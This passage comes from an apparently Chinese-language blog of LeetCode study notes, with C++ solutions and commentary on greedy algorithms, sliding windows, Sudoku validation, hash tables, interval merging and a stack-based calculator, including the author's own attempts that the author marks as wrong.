class="line"><span class="comment">// 联想到翻转操作的数组原语</span></span><br><span class="line"><span class="comment">// 我们只需要先翻转整个数组，再分别翻转前k%n个和其余的，翻转三次即可</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reverse</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[start], nums[end]);</span><br><span class="line">            start += <span class="number">1</span>;</span><br><span class="line">            end -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        k %= nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">reverse</span>(nums, <span class="number">0</span>, nums.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(nums, <span class="number">0</span>, k - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(nums, k, nums.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="简单的贪心">简单的贪心</h2><p>买卖股票：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 用一个结构数组打包然后直接排序</span></span><br><span class="line">        <span class="comment">// 贪心</span></span><br><span class="line">        <span class="type">int</span> cost = INT_MAX, profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> price : prices) &#123;</span><br><span class="line">            cost = <span class="built_in">min</span>(cost, price);</span><br><span class="line">            profit = <span class="built_in">max</span>(profit, price - cost);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="135-分糖果">135 分糖果</h2><p>开始没憋出来，题解没看懂但是看了一点一下想出来了。中途数组排序状态变化会影响结果的，或者说对”部分区间排序“或者所谓的”极大值“/“极小值”有要求的，可以考虑这个思路。我们先从左到右遍历一遍，只关注增幅度，不是增加的不管。然后反向重新遍历一遍，也是一样的思路，最终结果在两次中取最大就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">candy</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; ratings)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 两次遍历取最大</span></span><br><span class="line">        <span class="type">int</span> n=ratings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(n)</span></span>;</span><br><span class="line">        v[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ratings[i]&gt;ratings[i<span class="number">-1</span>])&#123;</span><br><span class="line">                v[i]=v[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> v[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ratings[i]&gt;ratings[i+<span class="number">1</span>])&#123;</span><br><span class="line">                v[i]=<span class="built_in">max</span>(v[i+<span class="number">1</span>]+<span class="number">1</span>,v[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> v[i]=<span class="built_in">max</span>(<span class="number">1</span>,v[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> e : v)&#123;</span><br><span class="line">            sum += e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1>滑动窗口</h1><p>最小字串问题</p><p>“in”，存在于而不关心具体位置 =&gt; unordered_map<br>如果是英文字符或者数字的话完全可以用数组下标做一一映射，快速随机存取而无需hashmap</p><ul class="lvl-0"><li class="lvl-2"><p><strong>128长数组相当于是ascii字符的哈希表</strong></p></li><li class="lvl-2"><p>不要太复杂的算法，用好基本的数据结构就行，觉得要更多信息就开空间存不要怕</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map &lt;<span class="type">char</span>, <span class="type">int</span>&gt; ori, cnt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;p: ori) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[p.first] &lt; p.second) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">string <span class="title">minWindow</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;c: t) &#123;</span><br><span class="line">            ++ori[c];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> len = INT_MAX, ansL = <span class="number">-1</span>, ansR = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (r &lt; <span class="built_in">int</span>(s.<span class="built_in">size</span>())) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ori.<span class="built_in">find</span>(s[++r]) != ori.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                ++cnt[s[r]];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">check</span>() &amp;&amp; l &lt;= r) &#123;</span><br><span class="line">                <span class="keyword">if</span> (r - l + <span class="number">1</span> &lt; len) &#123;</span><br><span class="line">                    len = r - l + <span class="number">1</span>;</span><br><span class="line">                    ansL = l;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (ori.<span class="built_in">find</span>(s[l]) != ori.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                    --cnt[s[l]];</span><br><span class="line">                &#125;</span><br><span class="line">                ++l;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ansL == <span class="number">-1</span> ? <span class="built_in">string</span>() : s.<span class="built_in">substr</span>(ansL, len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1>矩阵</h1><p>不要担心空间，只管加就行了，遍历一遍信息全记下来</p><p>数独判断，行列和3*3。</p><p>自己的方法写一半觉得太烂了，是暴力遍历，check3次遍历三次。而且小范围3<em>3还写的很烂。看别人的算法应该是函数传入左上角位置然后循环卡在3</em>3里面就行。</p><p>遍历一遍的方法是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidSudoku</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用位运算加速</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rows</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cols</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">block</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">9</span>;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(board[i][j]==<span class="string">&#x27;.&#x27;</span>)<span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> x = board[i][j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(rows[i]&gt;&gt;x&amp;<span class="number">1</span> || cols[j]&gt;&gt;x&amp;<span class="number">1</span> || block[(i/<span class="number">3</span>)*<span class="number">3</span>+j/<span class="number">3</span>]&gt;&gt;x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//加入</span></span><br><span class="line">                rows[i] |= <span class="number">1</span>&lt;&lt;x;</span><br><span class="line">                cols[j] |= <span class="number">1</span>&lt;&lt;x;</span><br><span class="line">                block[(i/<span class="number">3</span>)*<span class="number">3</span>+j/<span class="number">3</span>] |= <span class="number">1</span>&lt;&lt;x; <span class="comment">//(i,j)位于第(i/3)*3+j/3个九宫格</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>本质是二维数组，这里为了加速优化成了bitmap的感觉，每一位标记对应数字是否出现过。</p><h1>哈希表</h1><p>统计异位词，及字母一致顺序不同的单词，重新输出链表。先看标答1。标答主要是确定用哈希表之后，考虑用什么做哈希表的键。</p><p>或者说，标答开始就认为我们应当用某个特征去归类顺序不同但字母一致的单词，然后用哈希表处理，用统一化的特征作为key，按照这个统一过的key直接塞进哈希表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;</span><br><span class="line">        unordered_map&lt;string, vector&lt;string&gt;&gt; mp;</span><br><span class="line">        <span class="keyword">for</span> (string&amp; str: strs) &#123;</span><br><span class="line">            string key = str;</span><br><span class="line">            <span class="built_in">sort</span>(key.<span class="built_in">begin</span>(), key.<span class="built_in">end</span>());</span><br><span class="line">            mp[key].<span class="built_in">emplace_back</span>(str);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = mp.<span class="built_in">begin</span>(); it != mp.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">            ans.<span class="built_in">emplace_back</span>(it-&gt;second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我也有个思路，不过是自己实现的更快的哈希表。用bitmap统计字母出现与否，也就是整数+位运算记录是否存在。但是测例过不了，发现是需要统计字母数量，同样的字母组合数量不同bitmap没法表示，还是排序或者用26项数组来做。</p><h1>区间</h1><p>合并区间。自己的不对的算法。右端点排序不能保证可合并区间相邻，对于每一个区间都需要考察剩下的所有区间，所以是O(n^2)算法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; a,<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; b)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 算法课讲过的贪心？先要对区间排序然后遍历吧？</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">1</span>]&lt;b[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">merge</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        <span class="comment">// 对于任意的A,B两个区间，有如下规则：</span></span><br><span class="line">        <span class="comment">// 如果A的右端点属于B区间，那么就将二者合并为[min(lefta,leftb),rightb]</span></span><br><span class="line">        <span class="type">int</span> n=intervals.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">if_combine</span><span class="params">(n,<span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="comment">// 优先排序 Ologn</span></span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(),intervals.<span class="built_in">end</span>(),cmp);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++)&#123;</span><br><span class="line">            <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">tmp</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">            tmp=intervals[k];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=k+<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i==n) i--;</span><br><span class="line">                <span class="keyword">if</span>(if_combine[i]) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(tmp[<span class="number">1</span>]&gt;=intervals[i][<span class="number">0</span>])&#123;</span><br><span class="line">                    tmp[<span class="number">0</span>]=<span class="built_in">min</span>(tmp[<span class="number">0</span>],intervals[i][<span class="number">0</span>]);</span><br><span class="line">                    tmp[<span class="number">1</span>]=intervals[i][<span class="number">1</span>];</span><br><span class="line">                    <span class="comment">// 该区间已经被我们合并</span></span><br><span class="line">                    if_combine[i]=<span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!if_combine[k]) result.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>贪心对了，不过左端点排序的性质更好：可合并区间必定连续</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">merge</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        <span class="keyword">if</span> (intervals.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; merged;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; intervals.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="type">int</span> L = intervals[i][<span class="number">0</span>], R = intervals[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!merged.<span class="built_in">size</span>() || merged.<span class="built_in">back</span>()[<span class="number">1</span>] &lt; L) &#123;</span><br><span class="line">                merged.<span class="built_in">push_back</span>(&#123;L, R&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                merged.<span class="built_in">back</span>()[<span class="number">1</span>] = <span class="built_in">max</span>(merged.<span class="built_in">back</span>()[<span class="number">1</span>], R);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> merged;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1>栈</h1><p>加减法括号计算器。官解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">calculate</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; ops;</span><br><span class="line">        ops.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> sign = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">                sign = ops.<span class="built_in">top</span>();</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">                sign = -ops.<span class="built_in">top</span>();</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                ops.<span class="built_in">push</span>(sign);</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                ops.<span class="built_in">pop</span>();</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (i &lt; n &amp;&amp; s[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                    num = num * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                ret += sign * num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我自己写的没法处理单目运算符负号，想的是LR规约那种感觉。单目运算符±的好的处理办法就是官解那种，无论如何最后都是加，符号栈里放的是一个符号位，读到就设置，并且每个括号重新push符号位。</p><p>我自己写的在这个测试例子挂了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-(   -2)</span><br></pre></td></tr></table></figure><p>我的方法是在数字栈开始压入一个0后面的不动，但是对每个括号都压入0肯定会影响计算的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">states</span>&#123;</span><br><span class="line">        NUMBER,</span><br><span class="line">        LEFT_PARENTHESE,</span><br><span class="line">        RIGHT_PARENTHESE,</span><br><span class="line">        OP</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">calculate</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 编译原理这一块, 符号栈+规约</span></span><br><span class="line">        <span class="type">int</span> p=<span class="number">0</span>,state=<span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; stack_nums;</span><br><span class="line">        stack_nums.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        vector&lt;<span class="type">char</span>&gt; stack_ops;</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="comment">// 自动机？</span></span><br><span class="line">        <span class="keyword">while</span>(p&lt;s.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;reading: %c\n&quot;</span>,s[p]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isdigit</span>(s[p])) state=NUMBER;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[p]==<span class="string">&#x27;(&#x27;</span>) state=LEFT_PARENTHESE;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[p]==<span class="string">&#x27;)&#x27;</span>) state=RIGHT_PARENTHESE;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[p]==<span class="string">&#x27;+&#x27;</span> || s[p] == <span class="string">&#x27;-&#x27;</span>) state=OP;</span><br><span 